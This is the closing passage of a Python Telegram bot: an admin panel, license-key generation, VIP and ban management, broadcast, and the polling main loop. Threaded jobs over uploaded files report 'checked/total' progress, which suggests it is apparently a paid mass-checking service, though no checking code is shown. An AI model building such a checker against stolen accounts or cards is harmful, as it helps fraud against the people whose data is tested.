            await query.edit_message_text(
                f"👑 *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Users `{len(users)}` · Active `{ac}` · VIP `{vc}` · Banned `{bc}`\n"
                f"Lock {lock_s}\n━━━━━━━━━━━━━━━━━━━━",
                reply_markup=kb_admin_main(), parse_mode="Markdown"
            )
            await query.answer("Refreshed!"); return

        if data == "adm_stats": await cmd_stats(update, ctx); return

        if data == "adm_running":
            with job_lock:
                running = [(k, v) for k, v in active_jobs.items() if v.get("status") == "running"]
            if not running:
                await query.edit_message_text("No active sessions.", parse_mode="Markdown"); return
            lines = [f"*Running Sessions ({len(running)})*\n━━━━━━━━━━━━━━━━━━━━"]
            for ruid, rjob in running:
                lines.append(f"• `{ruid}` — {rjob.get('checked',0)}/{rjob.get('total',0)}")
            await query.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

        if data == "adm_toggle_lock":
            cfg = load_config()
            cfg["locked"] = not cfg.get("locked", False)
            save_config(cfg)
            await query.answer(f"Bot {'locked' if cfg['locked'] else 'unlocked'}!"); return

        if data == "adm_genkey":
            await query.edit_message_text(
                "🔑 *Generate Key*\nUse:\n`/genkey hours 24 1`\n`/genkey days 7 1`\n"
                "`/genkey months 1 1`\n`/genkey lifetime 1`",
                parse_mode="Markdown"
            ); return

        if data == "adm_broadcast_help":
            await query.edit_message_text(
                "📢 *Broadcast*\nUse `/broadcast Your message here` to send to all users.",
                parse_mode="Markdown"
            ); return

        if data == "adm_users":
            users = await user_manager.get_all_users()
            if not users:
                await query.edit_message_text("No users.", parse_mode="Markdown"); return
            lines = ["👥 *All Users*\n━━━━━━━━━━━━━━━━━━━━"]
            for u_id, info in list(users.items())[:30]:
                status = "🚫" if info.get("banned") else "✅"
                vip    = "⭐" if info.get("vip")    else ""
                active = "🔓" if info.get("activated") else "🔒"
                exp    = (info.get("key_expiry") or "No key")[:10]
                lines.append(f"`{u_id}` {status}{vip}{active} | {exp}")
            await query.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

        await query.edit_message_text("Unknown admin action.", parse_mode="Markdown"); return

    await query.edit_message_text("Unknown action.", parse_mode="Markdown")

# ────────────────────────────────────────────────────────────────
# POST INIT + MAIN
# ────────────────────────────────────────────────────────────────

async def post_init(app: Application) -> None:
    user_cmds = [
        BotCommand("start",    "Open dashboard"),
        BotCommand("redeem",   "Redeem a key"),
        BotCommand("stop",     "Stop current job"),
        BotCommand("status",   "Job status"),
        BotCommand("help",     "Help"),
    ]
    await app.bot.set_my_commands(user_cmds)
    if OWNER_ID:
        await app.bot.set_my_commands(user_cmds + [
            BotCommand("admin",      "Admin panel"),
            BotCommand("raw",        "Dump raw server responses"),
            BotCommand("genkey",     "Generate key"),
            BotCommand("remove_key", "Remove user key"),
            BotCommand("ban_user",   "Ban user"),
            BotCommand("unban_user", "Unban user"),
            BotCommand("addvip",     "Add VIP"),
            BotCommand("removevip",  "Remove VIP"),
            BotCommand("stats",      "Bot statistics"),
            BotCommand("broadcast",  "Broadcast message"),
            BotCommand("setthreads", "Set threads for user"),
        ], scope={"type": "chat", "chat_id": OWNER_ID})
    log.info(f"🚀 {BOT_NAME} v{BOT_VERSION} online")

def main():
    http_request = HTTPXRequest(
        connect_timeout=TELEGRAM_CONNECT_TIMEOUT,
        read_timeout=TELEGRAM_READ_TIMEOUT,
        write_timeout=TELEGRAM_WRITE_TIMEOUT,
        pool_timeout=TELEGRAM_POOL_TIMEOUT,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(http_request)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start",      cmd_start))
    app.add_handler(CommandHandler("redeem",     cmd_redeem))
    app.add_handler(CommandHandler("help",       cmd_help))
    app.add_handler(CommandHandler("stop",       cmd_stop))
    app.add_handler(CommandHandler("status",     cmd_status))
    app.add_handler(CommandHandler("admin",      cmd_admin))
    app.add_handler(CommandHandler("raw",        cmd_raw))
    app.add_handler(CommandHandler("genkey",     cmd_genkey))
    app.add_handler(CommandHandler("remove_key", cmd_remove_key))
    app.add_handler(CommandHandler("ban_user",   cmd_ban_user))
    app.add_handler(CommandHandler("unban_user", cmd_unban_user))
    app.add_handler(CommandHandler("addvip",     cmd_addvip))
    app.add_handler(CommandHandler("removevip",  cmd_removevip))
    app.add_handler(CommandHandler("stats",      cmd_stats))
    app.add_handler(CommandHandler("broadcast",  cmd_broadcast))
    app.add_handler(CommandHandler("setthreads", cmd_setthreads))

    app.add_handler(MessageHandler(filters.Document.ALL,            handle_document))
    app.add_handler(MessageHandler(filters.PHOTO,                   on_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(handle_callback))

    log.info(f"🔥 {BOT_NAME} v{BOT_VERSION} starting...")
    try:
        app.run_polling(
            bootstrap_retries=10,
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=False,
        )
    except NetworkError as e:
        log.error(f"Network error: {e}. Retrying in 5s...")
        time.sleep(5)
        main()
    except Exception as e:
        log.error(f"Fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()